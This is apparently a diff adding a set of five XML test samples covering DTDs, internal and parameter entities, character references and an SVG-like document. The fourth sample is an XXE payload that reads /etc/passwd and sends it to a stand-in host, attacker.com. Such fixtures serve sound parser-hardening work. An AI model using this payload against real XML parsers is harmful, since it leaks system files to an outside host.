@@ -1,0 +1,69 @@
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ELEMENT root (child*)>
+  <!ELEMENT child (#PCDATA)>
+  <!ATTLIST child id ID #REQUIRED>
+  <!ENTITY internal "expanded_value">
+]>
+<root>
+  <child id="c1">&internal;</child>
+  <child id="c2">text with &internal; embedded</child>
+</root>
+```
+
+```xml
+<!DOCTYPE doc [
+  <!ENTITY % param1 "entity_content">
+  <!ENTITY % param2 "%param1;%param1;">
+  <!ELEMENT doc ANY>
+]>
+<doc attr1="value1" attr2="value2">
+  <nested level="1">
+    <nested level="2">
+      <nested level="3">deep content</nested>
+    </nested>
+  </nested>
+</doc>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY ent1 "&#65;&#66;&#67;">
+  <!ENTITY ent2 "&#x44;&#x45;&#x46;">
+]>
+<root>
+  <element1>&ent1;</element1>
+  <element2>&ent2;</element2>
+  <element3>&#48;&#49;&#50;</element3>
+</root>
+```
+
+```xml
+<!DOCTYPE test [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
+  %eval;
+]>
+<test>
+  <payload>&exfiltrate;</payload>
+</test>
+```
+
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE svg [
+  <!ELEMENT svg (rect|circle|path)*>
+  <!ELEMENT rect EMPTY>
+  <!ELEMENT circle EMPTY>
+  <!ELEMENT path (#PCDATA)>
+  <!ATTLIST rect x CDATA #IMPLIED>
+  <!ATTLIST rect y CDATA #IMPLIED>
+]>
+<svg width="100" height="100">
+  <rect x="0" y="0" width="50" height="50"/>
+  <circle cx="25" cy="25" r="15"/>
+  <path d="M 10 10 L 90 90"/>
+</svg>
+```
